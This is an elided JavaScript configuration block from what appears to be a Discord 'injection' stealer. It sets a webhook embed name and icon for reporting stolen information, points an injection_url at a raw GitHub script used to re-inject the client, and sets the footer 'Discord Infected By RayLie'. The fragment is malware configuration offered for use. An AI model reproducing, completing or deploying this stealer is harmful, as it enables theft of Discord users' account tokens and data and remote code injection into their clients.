...
const config = {
  ...
  embed_name: 'RayLie Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1082021084624338964/1085157048808902757/lester.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/RayLieleD/Da-Utils/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '⚠️・Discord Infected By RayLie・',
        },
      },
    ],
  };
